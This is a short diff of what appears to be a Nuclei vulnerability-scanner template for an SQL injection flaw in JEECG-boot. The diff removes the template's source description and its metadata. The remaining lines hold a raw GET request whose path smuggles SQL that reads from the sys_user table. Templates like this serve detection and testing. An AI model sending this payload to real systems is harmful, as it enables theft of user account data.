@@ -3,12 +3,8 @@ info:
   name: jeecg-boot-getDictItemsByTable-sqli
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ap76rdz6vhgi1t9w'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ap76rdz6vhgi1t9w
-    fofa: app="JEECG"
 http:
 - raw:
   - 'GET /jeecg-boot/sys/ng-alain/getDictItemsByTable/''%20from%20sys_user/*,%20''/x.js HTTP/1.1
